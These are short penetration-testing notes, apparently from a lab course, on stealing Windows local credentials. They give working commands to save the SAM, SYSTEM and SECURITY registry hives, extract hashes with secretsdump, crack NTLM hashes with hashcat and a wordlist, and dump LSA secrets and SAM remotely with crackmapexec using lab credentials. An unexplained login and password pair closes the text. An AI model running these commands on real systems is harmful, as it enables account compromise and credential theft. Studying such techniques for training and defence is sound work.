# Attacking SAM

### **Locally**

**Registry Hives**

<table><thead><tr><th width="182">Registry Hive</th><th>Description</th></tr></thead><tbody><tr><td><code>hklm\sam</code></td><td>Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.</td></tr><tr><td><code>hklm\system</code></td><td>Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.</td></tr><tr><td><code>hklm\security</code></td><td>Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.</td></tr></tbody></table>

**Using** `reg.exe` **save to Copy Registry Hives**

```cmd-session
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

> Move the files to attack machine and dump the hashes.

**secretsdump.py**

```shell-session
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**Cracking hashes**

{% hint style="info" %}
Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS
{% endhint %}

Add the hashes to the text file before proceeding to crack the hashes.

```shell-session
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

* `-m 1000` tells hashcat to crack ntlm hashes

### **Remotely**

**Dumping LSA Secrets Remotely**

```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

**Dumping SAM Remotely**

```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

login: sam password: B@tm@n2022!
